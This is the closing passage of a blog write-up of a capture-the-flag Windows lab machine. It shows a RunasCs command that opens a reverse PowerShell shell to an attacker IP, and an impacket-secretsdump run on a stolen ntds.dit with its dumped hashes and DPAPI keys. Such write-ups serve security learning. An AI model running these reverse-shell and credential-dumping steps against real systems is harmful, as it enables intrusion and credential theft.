<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.14.2:443 -t 0</span><br><span class="line">[*] Warning: The logon for user &#x27;jeremy.combs&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running in session 0 with process function CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-e18972$\Default</span><br><span class="line">[+] Async process &#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27; with pid 3564 created in background.</span><br></pre></td></tr></table></figure>
<h2 id="Backing-it-up"><a href="#Backing-it-up" class="headerlink" title="Backing it up"></a>Backing it up</h2><p>Now going in to IT again we have the Third directory. Which contains backups, SECURITY, SYSTEM, and if we go into the Active Directory folder we find the ntds.dit. With all these transferred to our machine we can decode and get the Administrator hash.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC</span><br><span class="line">$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436</span><br><span class="line">dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3</span><br><span class="line">[*] NL$KM</span><br><span class="line"> 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...</span><br><span class="line"> 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7</span><br><span class="line"> 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..</span><br><span class="line"> 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....</span><br><span class="line">NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Deleted-Users-Accounts/">Deleted Users Accounts</a><a class="post-meta__tags" href="/tags/DPAPI/">DPAPI</a></div><div class="post-share"><div class="social-share" data-image="/img/voleur.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/30/Rustykey/" title="Rustykey (Windows Hard)"><img class="cover" src="/img/rustykey.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Rustykey (Windows Hard)</div></div><div class="info-2"><div class="info-item-1"> This Windows Hard box starts off assumed breach. While enumerating with the credentials you find that NTLM is disabled. Using your credentials you‚Äôre able to obtain a kerberos ticket that lets you get a bloodhound dump and further enumerate the machine. Once done, you‚Äôre able to kerberoast SPNs(Some did timeroast) and obtain some hashes, which one of them cracks to cleartext for IT-Computer3$. Using your new found credentials you‚Äôre able to abuse DACLs that allows our user to remove objects from the Protected Objects group. Thus allowing for ForceChangePassword and after successfully changing the password for bb.morgan, we are able to get a kerberos ticket, setup our krb5.conf and evil-winrm onto the box.  Enumeration as bb.morgan shows very little, yet we had a user ee.reed in the Support group. After changing his password, creating a reverse shell and using RunasCs.exe, we‚Äôre able to get a shell as ee.reed. Using PrivescCheck.ps1 shows us a COM Registry component we have...</div></div></div></a><a class="pagination-related" href="/2025/06/24/Axlle/" title="Axlle (Windows Hard)"><img class="cover" src="/img/axlle.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Axlle (Windows Hard)</div></div><div class="info-2"><div class="info-item-1"> Axlle is a hard-level Windows machine that begins with a website running on port 80. The site displays a maintenance message but mentions that Excel invoices can still be sent via email for processing. An attacker exploits this by crafting a malicious .XLL file, which bypasses security checks and is used in a phishing attack. Once the attacker gains code execution on the machine, they create a malicious .url file. This file is executed by the user dallon.matrix, leading to the compromise of their account. The dallon.matrix user is part of a group that has the ability to change the password of another user, jacob.greeny. The attacker leverages this privilege to reset the password and authenticate as jacob.greeny via WinRM. The jacob.greeny user is a member of the App Devs group, which has access to a scheduled automation that runs the StandaloneRunner binary with SYSTEM privileges. The attacker exploits this automated task to escalate privileges and ultimately gain a shell as the...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping üîêüîê</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP"><span class="toc-number">2.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB"><span class="toc-number">3.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#On-Box"><span class="toc-number">4.</span> <span class="toc-text">On Box</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DPAPI-AGAIN-Where-in-a-home-directory-duh"><span class="toc-number">5.</span> <span class="toc-text">DPAPI AGAIN, Where in a home directory duh!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backing-it-up"><span class="toc-number">6.</span> <span class="toc-text">Backing it up</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>